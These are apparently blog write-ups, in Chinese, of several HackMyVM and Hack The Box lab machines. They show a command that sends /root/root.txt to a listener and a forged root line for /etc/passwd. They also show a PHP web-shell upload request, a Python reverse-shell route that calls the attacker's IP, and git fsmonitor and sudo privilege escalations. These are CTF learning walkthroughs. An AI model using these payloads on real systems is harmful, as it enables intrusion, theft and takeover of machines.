<p>kali先开个nc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo trans -i /root/root.txt -x 192.168.64.3:8888</span><br><span class="line">nc -lvp 8888 &gt; trans</span><br></pre></td></tr></table></figure>

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316190434.png"   style="zoom:50%;" >

<p>得到一个包，尝试了一下url解码q后面的内容，就拿到flag</p>
<h4 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkpasswd -m sha-512</span><br></pre></td></tr></table></figure>

<p>先生成一个哈希字符串，然后拼接一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">but:$6$qzFU83LRKpBUmZCQ$qCQiwtXEjJmtTAOO2HRJsneHiliw9k2V2/3EtU64v9tP2eaud5fdtp5pQurFVtEsovQjfbo2j3KY.JmF0QqEL/:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>先复制一份原来的&#x2F;etc&#x2F;passwd，在&#x2F;tmp目录下伪造一个一样的最下面在加入我们伪造的字符串，<strong>思路就给靶机多加一个用户，有root权限</strong>，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u root trans -i www -o /etc/passwd -no-auto</span><br></pre></td></tr></table></figure>

<p>写入之后登陆我们伪造的用户，成功提权到root</p>
<h5 id="小抽象"><a href="#小抽象" class="headerlink" title="小抽象"></a>小抽象</h5><p>就是利用读写功能获取我们想要的东西，也可以对关键文件进行篡改</p>
<h3 id="teacher"><a href="#teacher" class="headerlink" title="teacher"></a>teacher</h3><p>web端扫描目录扫到，access.php,log.php，clearlog.php，看一下log.php，内容说有一个rabbit.jpg，访问之后一张·图片·，最开始用stegseek出了得到一个secret.txt里面写着”rabbithole”，不明所以，尝试登陆ssh也没有用</p>
<p>去到access.jpg，源代码src后面是空的，就联想到有没有可以写入的参数，fuzz了一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316200751.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -u &#x27;http://192.168.64.77/access.php?FUZZ=rabbit.jpg&#x27; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh=12</span><br></pre></td></tr></table></figure>

<p>果然得到了一个参数‘id’，然后看到了图片</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316200944.png" ></p>
<p>再看看这时的源码，然后就联想到命令注入，先闭合单引号，在写入命令试试</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316201116.png" ></p>
<p>经过一番探索（结合wp），发现可以直接注入php语句，还要配合前面的log.php，因为access.php不会执行，log.php记录了这些并且会执行，例如：</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316201809.png" ></p>
<p>发现了利用点，那就拿到第一个shell了，在html目录下发现有个pdf，下载查看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316202025.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316202055.png" ></p>
<p>虽然密码被糊住了，但是可以在前面找到自己，反向写出来就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pass = ThankYouTeachers</span><br></pre></td></tr></table></figure>

<p>然后就登陆了mrteacher账户，成功拿到userflag</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>Sudo -l 看到有gedit和xauth可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(ALL : ALL) NOPASSWD: /bin/gedit, /bin/xauth</span><br></pre></td></tr></table></figure>

<p>查了一下，<strong>xauth命令</strong> 用于显示和编辑被用于连接X服务器的认证信息。<strong>gedit</strong>是个文本编辑器</p>
<p><strong>思路就是利用gedit查看或修改root.txt（或其他任意文件），在这之前要先利用xauth增加一个认证，并且ssh登陆账号要加-x让SSH 客户端会在连接过程中启用 X11 转发。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ssh -X mrteacher@192.168.64.77</span><br><span class="line">mrteacher@192.168.64.77&#x27;s password: </span><br><span class="line">Linux Teacher 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sat Mar 16 13:25:36 2024 from 192.168.64.3</span><br><span class="line">mrteacher@Teacher:~$ sudo xauth list  列出当前用户的 X 认证信息</span><br><span class="line">Teacher/unix:10  MIT-MAGIC-COOKIE-1  5cfe7a29e891b822c5892ea140dc6706</span><br><span class="line">mrteacher@Teacher:~$ sudo xauth add Teacher/unix:10  MIT-MAGIC-COOKIE-1  5cfe7a29e891b822c5892ea140dc6706</span><br><span class="line">向授权文件中添加一个 MIT-MAGIC-COOKIE-1 权限</span><br></pre></td></tr></table></figure>

<p>增加权限后就使用gedit了，这个时候可以直接读取rootflag，也可以修改&#x2F;etc&#x2F;passwd增加一个用户提权（像上一个靶机一样），两种思路都可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gedit /root/root</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>web端命令注入结合日志文件，提权方面两个可利用点的结合，伪造用户或读取文件。</p>
<h3 id="warrior"><a href="#warrior" class="headerlink" title="warrior"></a>warrior</h3><p>web端扫到robots.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317014210.png" ></p>
<p>User.txt里面有个名字‘loco’我还想过爆破ssh，没有结果，secret.txt一个字符串看起来不是密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317014232.png" ></p>
<p>internal.php说要把MAC地址改成00:00:00:00:00:a? 最后一个问号还要一个一个试，网上找教程修改kali都mac地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ifconfig eth0 down</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ifconfig eth0 hw ether 00:00:00:00:00:af //最后试出来是af</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ifconfig eth0 up                        </span><br><span class="line">                                  </span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317011739.png" ></p>
<p>然后再访问，就得到了密码，我尝试了loco作为用户名居然无效，最后看了wp才知道还有一个用户名可以是bro（扶额苦笑），然后顺利登陆，想输入sudo回显没有这个命令，路径没设置好，要调用应该在&#x2F;usr&#x2F;sbin&#x2F;sudo，查到有个task可以利用，找了提权语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/sbin/sudo /usr/bin/task execute /bin/sh</span><br></pre></td></tr></table></figure>

<p>顺利拿到root</p>
<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>这个靶机的点主要在切换mac地址，还要尝试出来最后一位是f，bro这个也难想，以后要多考虑可以用cewl生成字典，提权比较简单。</p>
<h3 id="doc"><a href="#doc" class="headerlink" title="doc"></a>doc</h3><h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>难度：easy</p>
<p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Doc" >https://hackmyvm.eu/machines/machine.php?vm=Doc<i class="fas fa-external-link-alt"></i></a></p>
<p>ip地址：192.168.64.104</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>开了80端口和3306端口，先看看80端口，一打开就看到login选项，点击后发现要配置hosts文件，配置为doc.hmv，然后面对登陆框，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325100855.png" ></p>
<p>可以看到用了一个OTOMS的框架，有找到相关版本的漏洞，但要先登陆，随便输入点再抓个包，sqlmap测一下，是可以注入的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325101135.png" ></p>
<p>爆出两个数据库，再仔细看看里面的内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325101328.png" ></p>
<p>找到账号密码，登陆到后台，找到漏洞库（<a class="link"   href="https://www.exploit-db.com/exploits/50389%EF%BC%89%E8%AF%B4%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%82%B9%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E4%B8%AA%E4%BA%BA%E5%A4%B4%E5%83%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%8C%E5%85%88%E6%8A%93%E4%B8%AA%E5%8C%85" >https://www.exploit-db.com/exploits/50389）说的漏洞点，也就是个人头像修改文件上传，先抓个包<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325101948.png" ></p>
<p>然后按照poc发送包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /classes/Users.php?f=save HTTP/1.1</span><br><span class="line">Host: doc.hmv</span><br><span class="line">Content-Length: 1018</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Origin: http://doc.hmv</span><br><span class="line">Referer: http://doc.hmv/admin/?page=user</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: PHPSESSID=smop95l7ie9o8dn57cv56s1so8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">9</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;firstname&quot;</span><br><span class="line"></span><br><span class="line">John</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;lastname&quot;</span><br><span class="line"></span><br><span class="line">Smith</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;username&quot;</span><br><span class="line"></span><br><span class="line">jsmith</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;type&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;img&quot;; filename=&quot;cmd.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;HTML&gt;&lt;BODY&gt;</span><br><span class="line">&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;</span><br><span class="line">&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;x&quot;&gt;</span><br><span class="line">&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if($_REQUEST[&#x27;x&#x27;]) &#123;</span><br><span class="line">  system($_REQUEST[&#x27;x&#x27;]);</span><br><span class="line">  &#125; else phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/BODY&gt;&lt;/HTML&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh--</span><br></pre></td></tr></table></figure>

<p>发送成功后，头像从原来有张图片到现在加载不出来，在图片那里右键打开图片链接</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102116.png" ></p>
<p>文件上传利用成功，接下来就输入nc反弹一个shell即可</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102209.png" ></p>
<h4 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102250.png" ></p>
<p>在&#x2F;var&#x2F;www&#x2F;html的目录下找到数据库账号密码，也有看到bella用户，然后就尝试用这个登陆bella，成功</p>
<p>然后sudo -l查到doc可以利用，先执行看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102530.png" ></p>
<p>它打开了本地7890端口，再拿一个shell然后用socat转发端口看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102829.png" ></p>
<p>看起来是个文件管理系统，看了题解才知道这是pydoc，他是有漏洞的，一个思路是“&#x2F;getfile?key&#x3D;”后面跟上文件名就能读取到想要的文件，就可以&#x2F;getfile?key&#x3D;&#x2F;root&#x2F;root.txt</p>
<p>还有一个思路是在tmp目录下创建一个py文件，然后在见面搜索访问，也能执行我们想要的语句。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325104332.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325104446.png" ></p>
<p>提权成功</p>
<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>这个靶机相对简单，也有一定的曲折，最后的pydoc没接触过，值得学习。</p>
<p>doc的源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;/usr/bin/pydoc3.9 -p 7890&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>htb OpenSource复盘</title>
    <url>/2024/09/11/htb-OpenSource%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a class="link"   href="https://blog.csdn.net/Purpose_7/article/details/128707843" >https://blog.csdn.net/Purpose_7/article/details/128707843<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://medium.com/@joemcfarland/hack-the-box-opensource-writeup-96d1671b8d78" >https://medium.com/@joemcfarland/hack-the-box-opensource-writeup-96d1671b8d78<i class="fas fa-external-link-alt"></i></a></p>
<p>官方wp</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# nmap -A -p- --min-rate=1000 -T4 10.10.11.164  </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-11 03:49 PDT</span><br><span class="line">Warning: 10.10.11.164 giving up on port because retransmission cap hit (6).</span><br><span class="line">Stats: 0:04:34 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 50.00% done; ETC: 03:55 (0:01:25 remaining)</span><br><span class="line">Nmap scan report for 10.10.11.164</span><br><span class="line">Host is up (0.51s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line">22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)</span><br><span class="line">|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)</span><br><span class="line">|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)</span><br><span class="line">80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3</span><br><span class="line">|_http-server-header: Werkzeug/2.1.2 Python/3.10.3</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Server: Werkzeug/2.1.2 Python/3.10.3</span><br><span class="line">|     Date: Wed, 11 Sep 2024 10:42:24 GMT</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 5316</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">。。。</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;Error code: 400&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Message: Bad request version (&#x27;RTSP/1.0&#x27;).&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line">|_http-title: upcloud - Upload files for Free!</span><br><span class="line">3000/tcp filtered ppp</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port80-TCP:V=7.94SVN%I=7%D=9/11%Time=66E1767F%P=aarch64-unknown-linux-g</span><br><span class="line">SF:nu%r(GetRequest,1573,&quot;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.</span><br><span class="line">。。。</span><br><span class="line">OS:164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 993/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   554.57 ms 10.10.16.1</span><br><span class="line">2   391.34 ms 10.10.11.164</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 357.94 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先看80端口，有一个&#x2F;upcloud，&#x2F;download和&#x2F;uploads，看到是flask的，所以在上传点没考虑php。上传py文件后访问服务器没有运行，不考虑。前面nmap扫到一个应用版本<code>Werkzeug/2.1.2</code>没有看到明显可以用的漏洞，不考虑。直接访问&#x2F;console需要pin码，没有看到。</p>
<p>来到&#x2F;download，自动下载一个soucre.zip，解压看看，有个git文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911190158.png" ></p>
<p>看到git 日志，注意到指向了public分支，看看有没有别的分支</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911190228.png" ></p>
<p>可以看到有个dev，切换过去，有新的log</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Downloads/source]</span><br><span class="line">└─# git branch</span><br><span class="line">  dev</span><br><span class="line">* public</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/home/kali/Downloads/source]</span><br><span class="line">└─# git checkout dev                                                                                  </span><br><span class="line">Already on &#x27;dev&#x27;</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Downloads/source]</span><br><span class="line">└─# git log         </span><br><span class="line">commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -&gt; dev, switch)</span><br><span class="line">Author: gituser &lt;gituser@local&gt;</span><br><span class="line">Date:   Thu Apr 28 13:47:24 2022 +0200</span><br><span class="line"></span><br><span class="line">    ease testing</span><br><span class="line"></span><br><span class="line">commit be4da71987bbbc8fae7c961fb2de01ebd0be1997</span><br><span class="line">Author: gituser &lt;gituser@local&gt;</span><br><span class="line">Date:   Thu Apr 28 13:46:54 2022 +0200</span><br><span class="line"></span><br><span class="line">    added gitignore</span><br><span class="line"></span><br><span class="line">commit a76f8f75f7a4a12b706b0cf9c983796fa1985820</span><br><span class="line">Author: gituser &lt;gituser@local&gt;</span><br><span class="line">Date:   Thu Apr 28 13:46:16 2022 +0200</span><br><span class="line"></span><br><span class="line">    updated</span><br><span class="line"></span><br><span class="line">commit ee9d9f1ef9156c787d53074493e39ae364cd1e05</span><br><span class="line">Author: gituser &lt;gituser@local&gt;</span><br><span class="line">Date:   Thu Apr 28 13:45:17 2022 +0200</span><br><span class="line"></span><br><span class="line">    initial</span><br></pre></td></tr></table></figure>

<p>翻找了一下能够看到dev01用户的密码，直接拿去登陆ssh，尝试失败</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911190732.png" ></p>
<h4 id="立足点"><a href="#立足点" class="headerlink" title="立足点"></a>立足点</h4><p>看一下source其他文件，在source&#x2F;app&#x2F;app&#x2F;views.py，看到文件上传的逻辑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upcloud&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        file_name = get_file_name(f.filename)</span><br><span class="line">        file_path = os.path.join(os.getcwd(), <span class="string">&quot;public&quot;</span>, <span class="string">&quot;uploads&quot;</span>, file_name)</span><br><span class="line">        f.save(file_path)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;success.html&#x27;</span>, file_url=request.host_url + <span class="string">&quot;uploads/&quot;</span> + file_name)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/uploads/&lt;path:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_report</span>(<span class="params">path</span>):</span><br><span class="line">    path = get_file_name(path)</span><br><span class="line">    <span class="keyword">return</span> send_file(os.path.join(os.getcwd(), <span class="string">&quot;public&quot;</span>, <span class="string">&quot;uploads&quot;</span>, path))</span><br></pre></td></tr></table></figure>

<p>看别的wp说是os.path.john，没有过滤直接拼接了，<strong>如果在文件名中插入斜杠字符，则不会考虑路径的其余部分</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911191354.png"  alt="官方wp演示"></p>
<p>所以我们利用这一点，把文件名改为&#x2F;app&#x2F;app&#x2F;views.py，替换原来的views.py(抓包实现)，在里面写入新的功能拿到shell</p>
<p>在新的views.py里面增加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/revshell/&lt;ip&gt;&#x27;)</span><br><span class="line">def rev_shell(ip):</span><br><span class="line">    import socket,os,pty</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((ip,1234))</span><br><span class="line">    os.dup2(s.fileno(),0)</span><br><span class="line">    os.dup2(s.fileno(),1)</span><br><span class="line">    os.dup2(s.fileno(),2)</span><br><span class="line">    pty.spawn(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>

<p>抓包改文件名上传</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911191929.png" ></p>
<p>本地开启监听，然后访问<code>10.10.11.164/revshell/10.10.16.2</code>，拿到shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911192102.png" ></p>
<h4 id="拿到user"><a href="#拿到user" class="headerlink" title="拿到user"></a>拿到user</h4><p>又看到.dockerenv文件，可以确定是在docker里面，上传一个fscan扫描，看到开了几个ip，本地curl内容都差不多</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911193125.png" ></p>
<p>访问（wget）这几个ip都是和之前直接访问80端口一样的内容。除了172.17.0.1，有个3000端口，是个gitea，尝试搭建个隧道转发出来</p>
<p>这里用到<a class="link"   href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html" >chisel<i class="fas fa-external-link-alt"></i></a>搭建，在kali上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ./chisel_1.10.0_linux_arm64 server -p 8000 --reverse</span><br><span class="line">2024/09/11 04:54:47 server: Reverse tunnelling enabled</span><br><span class="line">2024/09/11 04:54:47 server: Fingerprint TolIpzRv4g1qkoHO0zNMWbtOoAgYjXKucuJrFsfNvBE=</span><br><span class="line">2024/09/11 04:54:47 server: Listening on http://0.0.0.0:8000</span><br></pre></td></tr></table></figure>

<p>靶机上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp # ./chisel_1.10.0_linux_amd64 client 10.10.16.2:8000 R:3000:172.17.0.1:3000</span><br><span class="line">./chisel_1.10.0_linux_amd64 client 10.10.14.6:8000 R:3000:172.17.0.1:3000</span><br><span class="line">2024/09/11 11:47:02 client: Connecting to ws://10.10.14.6:8000</span><br></pre></td></tr></table></figure>

<p>然后kali访问127.0.0.1:3000，就能看到gitea，然后之前在git里找到一个dev01的账号密码，这个时候就能派上用场了</p>
<p>登陆后在仓储里看到.ssh目录，可以直接读取id_rsa，复制保存到本地，直接登录了，拿到了dev01的shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>拿到后一番搜寻，没什么发现，上传一个pspy64并运行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911200759.png" ></p>
<p>有一个&#x2F;bin&#x2F;bash &#x2F;usr&#x2F;local&#x2F;bin&#x2F;git-sync（有点难发现），查看内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dev01@opensource:/tmp$ cat /usr/local/bin/git-sync</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">cd /home/dev01/</span><br><span class="line"></span><br><span class="line">if ! git status --porcelain; then</span><br><span class="line">    echo &quot;No changes&quot;</span><br><span class="line">else</span><br><span class="line">    day=$(date +&#x27;%Y-%m-%d&#x27;)</span><br><span class="line">    echo &quot;Changes detected, pushing..&quot;</span><br><span class="line">    git add .</span><br><span class="line">    git commit -m &quot;Backup for $&#123;day&#125;&quot;</span><br><span class="line">    git push origin main</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>主要是在git配置dev01的家目录，根据官方wp思路，我们可以修改git的配置文件，这样就能间接地利用root权限执行我们想干的事</p>
<p>在~&#x2F;.git&#x2F;config中写入 <code>fsmonitor = &quot;chmod 4755 /bin/bash&quot;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dev01@opensource:~/.git$ nano config </span><br><span class="line">dev01@opensource:~/.git$ cat config </span><br><span class="line">[core]</span><br><span class="line">        repositoryformatversion = 0</span><br><span class="line">        filemode = true</span><br><span class="line">        bare = false</span><br><span class="line">        logallrefupdates = true</span><br><span class="line">        fsmonitor = &quot;chmod 4755 /bin/bash&quot;</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">        url = http://opensource.htb:3000/dev01/home-backup.git</span><br><span class="line">        fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch &quot;main&quot;]</span><br><span class="line">        remote = origin</span><br><span class="line">        merge = refs/heads/main</span><br></pre></td></tr></table></figure>

<p>然后等待一会，再bash -p就能拿到root</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>虽然是easy的靶机，还是相当有特点啊，不愧是htb（，其实多数都是参考来的思路，还是希望自己有耐心一直去探索思路直到成功</p>
